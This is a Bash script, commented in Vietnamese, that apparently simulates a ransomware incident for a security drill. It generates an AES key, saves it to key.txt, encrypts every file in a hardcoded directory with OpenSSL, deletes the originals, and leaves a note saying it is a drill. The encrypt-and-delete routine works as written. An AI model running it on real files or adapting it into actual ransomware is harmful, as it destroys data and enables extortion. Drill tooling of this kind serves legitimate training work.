#!/bin/bash

# Dừng script ngay khi có lỗi
set -e

# --- CÀI ĐẶT ---
KEY_FILE="key.txt"
RANSOM_NOTE="_FILES_ENCRYPTED_.txt"
EXTENSION=".drill"
# ----------------

# Kiểm tra xem OpenSSL đã được cài đặt chưa
if ! command -v openssl &> /dev/null; then
    echo "[LỖI] OpenSSL không được tìm thấy. Vui lòng cài đặt OpenSSL."
    exit 1
fi

# Cung cấp thư mục đích
TARGET_DIR="/home/namtn/encrypt"
if [ ! -d "$TARGET_DIR" ]; then
    echo "[LỖI] Thư mục \"$TARGET_DIR\" không tồn tại."
    exit 1
fi

# =================== PHẦN MỚI THÊM ===================
# Kiểm tra xem thư mục đã bị mã hóa chưa
echo "[INFO] Kiểm tra trạng thái thư mục..."
# Tìm kiếm bất kỳ file nào có đuôi .drill, -print sẽ in tên file, -quit sẽ thoát ngay khi tìm thấy
# Kết quả sẽ được lưu vào biến check_file
check_file=$(find "$TARGET_DIR" -type f -name "*$EXTENSION" -print -quit)

# Nếu biến check_file không rỗng, nghĩa là đã tìm thấy file
if [ -n "$check_file" ]; then
    echo "[CẢNH BÁO] Đã tìm thấy file đã mã hóa (ví dụ: $check_file)."
    echo "Script sẽ không thực hiện để tránh mã hóa lại dữ liệu."
    exit 0
fi
echo "[INFO] Thư mục chưa bị mã hóa. Bắt đầu quá trình..."
echo ""
# =======================================================

# Chuyển đến thư mục đích
cd "$TARGET_DIR"

# 1. Tạo key ngẫu nhiên và lưu vào key.txt
echo "[INFO] Đang tạo key mã hóa..."
KEY=$(openssl rand -base64 32)
echo "$KEY" > "$KEY_FILE"
echo "[INFO] Đã tạo key và lưu vào file: $KEY_FILE"

# 2. Mã hóa file và 3. Xóa file gốc
echo "[INFO] Bắt đầu quá trình mã hóa..."
find . -type f -not -name "$KEY_FILE" -not -name "$RANSOM_NOTE" -not -name "*$EXTENSION" -not -path "./$(basename $0)" -print0 | while IFS= read -r -d $'\0' file; do
    openssl enc -aes-256-cbc -salt -in "$file" -out "$file$EXTENSION" -pass pass:"$KEY" -pbkdf2 && rm "$file"
done

# 4. Tạo file text cảnh báo
echo "[INFO] Đang tạo file cảnh báo..."
cat << EOF > "$RANSOM_NOTE"
@@@ CẢNH BÁO QUAN TRỌNG @@@

Tất cả các file quan trọng của bạn trong thư mục $TARGET_DIR đã bị MÃ HÓA.
Để khôi phục lại file, bạn cần key giải mã duy nhất.

Đây là một phần của DIỄN TẬP RANSOMWARE.
Nếu đây là tình huống thực, bạn sẽ được yêu cầu trả tiền chuộc.

Vui lòng báo cáo sự cố này cho đội ngũ IT/Security của bạn ngay lập tức.
EOF

echo
echo "[HOÀN TẤT] Quá trình mã hóa đã hoàn thành."